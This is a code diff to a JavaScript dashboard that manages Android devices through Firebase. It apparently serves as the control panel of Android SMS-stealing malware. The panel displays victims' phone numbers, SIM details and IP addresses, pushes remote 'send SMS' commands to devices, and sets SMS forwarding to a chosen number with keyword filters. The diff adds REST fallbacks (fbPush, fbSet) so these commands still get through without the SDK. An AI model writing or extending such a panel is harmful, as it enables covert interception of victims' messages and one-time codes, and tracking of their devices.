@@ -1344,7 +1344,7 @@ function renderSidebar(){
         errMsg+='<span style="opacity:0.65;margin-top:6px;display:block;font-size:8px">APK mein purana cached data dikh sakta hai. Firebase Console se database enable karo.</span>';
       }
     }
-    el.innerHTML='<div class="dev-empty">'+ico('📡','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
+    el.innerHTML='<div class="dev-empty">'+icoAnim('satellite','i3d-blue i3d-lg')+'<br>'+(inst?esc(inst.name):'Firebase')+': No devices yet<br><span style="opacity:0.6;margin-top:6px;display:block">Loading or empty project</span>'+errMsg+'</div>';
     return;
   }
   window._sidebarList=list;
@@ -1386,7 +1386,7 @@ function openDevice(id){
 
 function updateHero(d){
   document.getElementById('dName').textContent=d.displayPhone!=='No Number'?d.displayPhone+(d.brand?' ('+d.brand+')':''):d.name+(d.brand?' ('+d.brand+')':'');
-  document.getElementById('dBrand').innerHTML='Android '+d.android+' · '+ico('🔥','i3d-fire i3d-sm')+' '+esc(d.fbName);
+  document.getElementById('dBrand').innerHTML='Android '+d.android+' · '+icoAnim('fire','i3d-fire i3d-sm')+' '+esc(d.fbName);
   document.getElementById('dId').textContent='ID: '+d.rawId+' · node: '+d.deviceNode;
   var badge=document.getElementById('dBadge');
   badge.className='hero-badge '+d.status;
@@ -1436,8 +1436,8 @@ function loadRabelSim(dev){
   restPoll(dev.fbId,'clients/'+dev.rawId,function(data){
     var g=document.getElementById('simGrid');
     if(!data){g.innerHTML='<div style="color:var(--muted);font-family:Space Mono,monospace;font-size:10px">No device info</div>';return;}
-    var fields=[[ico('📱','i3d-blue i3d-sm'),'Model',data.modelName],[ico('📞','i3d-green i3d-sm'),'Mobile',data.mobNo],[ico('🔋','i3d-orange i3d-sm'),'Battery',data.battery],[ico('📶','i3d-fire i3d-sm'),'Network',data.service_provider],[ico('💾','i3d-purple i3d-sm'),'Storage',data.storage],[ico('🌐','i3d-blue i3d-sm'),'IP',data.ip_address],[ico('🤖','i3d-green i3d-sm'),'Android',data.androidV]];
-    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([ico('📲','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
+    var fields=[[icoAnim('mobile','i3d-blue i3d-sm'),'Model',data.modelName],[icoAnim('phone','i3d-green i3d-sm'),'Mobile',data.mobNo],[icoAnim('battery','i3d-orange i3d-sm'),'Battery',data.battery],[icoAnim('signal','i3d-fire i3d-sm'),'Network',data.service_provider],[icoAnim('save','i3d-purple i3d-sm'),'Storage',data.storage],[icoAnim('globe','i3d-blue i3d-sm'),'IP',data.ip_address],[icoAnim('robot','i3d-green i3d-sm'),'Android',data.androidV]];
+    if(data.sims&&data.sims.length) data.sims.forEach(function(sim,i){fields.push([icoAnim('sim','i3d-green i3d-sm'),'SIM '+(i+1),sim.carrierName+' · '+sim.phoneNumber]);});
     g.innerHTML='<div class="sim-card">'+fields.map(function(f){
       var lbl=f.length>2?f[0]+' '+f[1]:f[0], val=f.length>2?f[2]:f[1];
       return '<div class="sim-row"><span class="sim-key">'+lbl+'</span><span class="sim-val">'+(val?esc(String(val)):'<span style="color:var(--muted)">N/A</span>')+'</span></div>';
@@ -1553,37 +1553,69 @@ function switchDataTab(name,btn){
   ensureTabLoaded(name);
 }
 
+// ═══ FIREBASE WRITE (SDK or REST) ═══
+function fbPush(inst,path,data){
+  if(!inst) return Promise.reject(new Error('Firebase not connected'));
+  if(inst.db){
+    var payload=Object.assign({},data);
+    payload.timestamp=firebase.database.ServerValue.TIMESTAMP;
+    return inst.db.ref(path).push(payload);
+  }
+  if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
+  var body=Object.assign({},data,{timestamp:Date.now()});
+  return fetch(inst.restUrl+'/'+path+'.json',{
+    method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)
+  }).then(function(r){
+    if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
+    return r.json();
+  });
+}
+function fbSet(inst,path,value){
+  if(!inst) return Promise.reject(new Error('Firebase not connected'));
+  if(inst.db) return inst.db.ref(path).set(value);
+  if(!inst.restUrl) return Promise.reject(new Error('Firebase not connected'));
+  return fetch(inst.restUrl+'/'+path+'.json',{
+    method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(value)
+  }).then(function(r){
+    if(!r.ok) return r.json().then(function(e){throw new Error((e&&e.error)||'Write failed');});
+    return r.json();
+  });
+}
+
 // ═══ SEND SMS ═══
 function sendSms(){
   var dev=getSelDev();
   if(!dev){showToast('error','No device selected!');return;}
   var inst=getFbInstance(dev.fbId);
-  if(!inst||!inst.db){showToast('error','Firebase not connected!');return;}
+  if(!inst){showToast('error','Firebase not connected!');return;}
   var n=document.getElementById('sendTo').value.trim(), m=document.getElementById('sendMsg').value.trim();
   if(!n||!m){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">Fill all fields</span>';return;}
-  inst.db.ref(dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms').push({to:n,message:m,timestamp:firebase.database.ServerValue.TIMESTAMP})
+  var path=dev.deviceNode+'/'+dev.rawId+'/manual_commands/send_sms';
+  document.getElementById('sendStatus').innerHTML='<span style="color:var(--muted)">Sending...</span>';
+  fbPush(inst,path,{to:n,message:m})
     .then(function(){document.getElementById('sendStatus').innerHTML='<span style="color:var(--success)">✅ Command sent!</span>';document.getElementById('sendMsg').value='';showToast('success','✅ SMS queued on device');})
-    .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+e.message+'</span>';});
+    .catch(function(e){document.getElementById('sendStatus').innerHTML='<span style="color:var(--error)">❌ '+esc(e.message||'Failed')+'</span>';showToast('error',e.message||'Send failed');});
 }
 
 // ═══ FORWARDING ═══
 function toggleFw(){
   var dev=getSelDev(); if(!dev)return;
   var inst=getFbInstance(dev.fbId); if(!inst)return;
-  inst.db.ref(dev.deviceNode+'/'+dev.rawId+'/forwarding_settings/enabled').set(document.getElementById('fwToggle').checked);
+  fbSet(inst,dev.deviceNode+'/'+dev.rawId+'/forwarding_settings/enabled',document.getElementById('fwToggle').checked).catch(function(){});
 }
 function saveFw(){
   var dev=getSelDev();
   if(!dev){showToast('error','No device selected!');return;}
-  var inst=getFbInstance(dev.fbId); if(!inst)return;
+  var inst=getFbInstance(dev.fbId); if(!inst){showToast('error','Firebase not connected!');return;}
   var filters=document.getElementById('fwFilters').value.split(',').map(function(f){return f.trim();}).filter(Boolean);
-  inst.db.ref(dev.deviceNode+'/'+dev.rawId+'/forwarding_settings').set({
+  fbSet(inst,dev.deviceNode+'/'+dev.rawId+'/forwarding_settings',{
     enabled:document.getElementById('fwToggle').checked,
     forward_to:document.getElementById('fwNumber').value.trim(),
     forward_all:document.getElementById('fwAll').checked,
     filters:filters,
-    updated_at:firebase.database.ServerValue.TIMESTAMP
-  },function(e){e?showToast('error','❌ Save failed'):showToast('success','✅ Settings saved!');});
+    updated_at:Date.now()
+  }).then(function(){showToast('success','✅ Settings saved!');})
+    .catch(function(){showToast('error','❌ Save failed');});
 }
 
 // ═══ HELPERS ═══
@@ -1843,8 +1875,8 @@ function renderFirebaseList(){
     var nodes=inst&&inst.discoveredNodes.length?inst.discoveredNodes.join(', '):'discovering...';
     var st=inst&&inst.connError?'<div class="fb-item-url" style="color:var(--error)">⚠ '+esc(inst.connError)+'</div>':'';
     return '<div class="fb-item"><div><div class="fb-item-name">'+esc(cfg.name)+'</div>'+
-      '<div class="fb-item-secure">'+ico('🔒','i3d-green i3d-sm i3d-static')+' Secure · URL hidden</div>'+st+
-      '<div class="fb-item-nodes">'+ico('📂','i3d-orange i3d-sm i3d-static')+' Nodes: '+esc(nodes)+'</div></div>'+
+      '<div class="fb-item-secure">'+icoAnim('secure','i3d-green i3d-sm')+' Secure · URL hidden</div>'+st+
+      '<div class="fb-item-nodes">'+icoAnim('folder','i3d-orange i3d-sm')+' Nodes: '+esc(nodes)+'</div></div>'+
       (PROTECTED_FB_IDS.indexOf(cfg.id)<0?'<button class="fb-del" onclick="removeFirebaseProject(\''+cfg.id+'\')">✕</button>':'')+
       '</div>';
   }).join('');
